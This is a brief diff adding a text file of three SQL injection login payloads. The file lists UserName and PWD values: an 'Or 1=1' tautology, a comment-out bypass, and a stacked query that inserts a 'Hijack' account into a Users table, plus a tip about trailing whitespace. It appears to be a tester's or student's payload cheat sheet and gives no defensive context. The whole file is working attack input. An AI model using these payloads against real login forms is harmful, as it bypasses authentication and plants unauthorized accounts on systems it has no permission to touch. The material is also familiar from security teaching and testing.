@@ -1,0 +1,17 @@
+------------------------------------
+UserName: AA
+PWD: xxx' Or 1=1 Or UserName='
+
+------------------------------------
+UserName: ' Or 1=1 --
+PWD: 'xx
+
+
+------------------------------------
+##### Add whitespace at the end of the UserName
+UserName: ';INSERT INTO Users VALUES ('Hijack','This')-- 
+PWD: 'xx
+
+
+
+
